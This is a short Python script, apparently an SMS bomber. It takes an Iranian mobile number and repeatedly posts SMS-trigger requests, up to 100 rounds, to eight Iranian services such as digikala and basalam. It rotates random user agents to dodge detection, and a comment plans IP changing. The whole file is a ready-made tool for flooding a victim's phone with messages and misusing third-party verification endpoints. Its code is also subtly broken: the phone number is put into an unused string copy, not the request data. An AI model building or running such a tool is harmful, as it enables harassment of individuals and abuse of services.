# Dadmehr - Garfox
# packages
import requests
import random
import json
import re

from lib import Banner
from fake_useragent import UserAgent

range_n_limit = 100
cunt = 0
services = ['rirabook', 'doctoreto','SMS.ir','vipshop','digikala','okala','basalam','banimode']


def validate_phone_number(phone_number):
    pattern = r'^09\d{9}$'
    if re.match(pattern, phone_number):
        return True
    else:
        return False


def send(phone_number, range_n):  # add prvity Change IP
    global cunt

    # Validate phone number
    if not validate_phone_number(phone_number):
        print("Invalid Phone number")
        return

    # Load lib/API/sms.json
    with open('./lib/API/sms.json') as json_file:
        data = json.load(json_file)

        # Replace phone number in data
        rep_data = str(data)
        rep_data = rep_data.replace('numnum', phone_number)
        print(phone_number)

    if int(range_n) <= range_n_limit:
        for i in range(1, int(range_n) + 1):
            cunt = i
            # +_+_+_+ User Agent Generator +_+_+_+
            ua = UserAgent()
            headers = {'User-Agent': ua.random}
            for service in services:
                # convert service list to str
                service_name = str(service)
                print(service_name)

                # load apos in sms.json
                url_data = data[service_name]

                url = url_data['url']
                req_data = url_data['data']

                req = requests.post(url=url, data=req_data, headers=headers)
                print(req, cunt)
    else:
        print('Send Range Limit 100')


banner = Banner.banner()
